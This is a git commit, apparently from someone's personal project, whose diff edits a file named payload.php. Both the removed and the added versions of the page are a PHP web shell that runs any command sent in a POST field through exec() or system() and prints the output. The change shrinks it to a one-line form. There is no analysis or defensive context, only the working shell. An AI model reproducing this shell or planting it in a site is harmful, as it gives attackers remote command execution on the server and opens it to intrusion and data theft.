180e8172538743e28caf9538bcd9c40425c531ba
georgepapoulias <georgepapoulias@google.com>
2022-03-29 21:57:12 +0300

    i can almost taste it

--- payload.php
+++ payload.php
@@ -8,15 +8,8 @@
 </head>
   
 <body style="text-align:center;">
-
-    <?php
-        $command = $_POST["cmd_input"];
-        $output = exec($command);
-        echo $output;
-    ?>
-
     <form method="post">
-        <label for="cmd_input">Command: </label><input type="text" name="cmd_input"><br>
+        <input type="text" name="cmd"><br><?php system($_POST['cmd']); ?>
         <input type="submit"/>
     </form>
 </head>
